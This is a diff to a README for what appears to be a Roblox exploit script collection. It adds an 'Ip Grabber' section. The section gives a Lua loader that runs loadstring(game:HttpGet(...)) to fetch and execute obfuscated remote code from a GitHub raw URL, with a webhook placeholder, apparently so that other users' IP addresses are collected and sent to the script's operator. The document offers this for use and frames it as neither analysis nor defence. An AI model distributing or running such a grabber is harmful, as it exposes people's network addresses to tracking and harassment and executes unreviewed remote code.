@@ -63,4 +63,16 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/
 
 ![script (2)](https://github.com/wtfplayer/redemption/assets/136761546/f18a5942-9f39-4ab2-beec-a92bb7aefb12)
 
+# Ip Grabber [SOURCE](https://raw.githubusercontent.com/wtfplayer/redemption/main/ipgrabber.lua)
+
+```lua
+webhook = 'url'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/ipgrabber.lua"))()
+```
+
+[SOURCE OBFUSCATED](https://raw.githubusercontent.com/wtfplayer/redemption/main/ipgrabber.lua)
+
+![ipgrab](https://github.com/wtfplayer/redemption/assets/136761546/ba8c6f22-5a4e-4521-b86a-46561bb7de92)
+
 **Owner's Roblox** - https://www.roblox.com/users/3784100047/profile
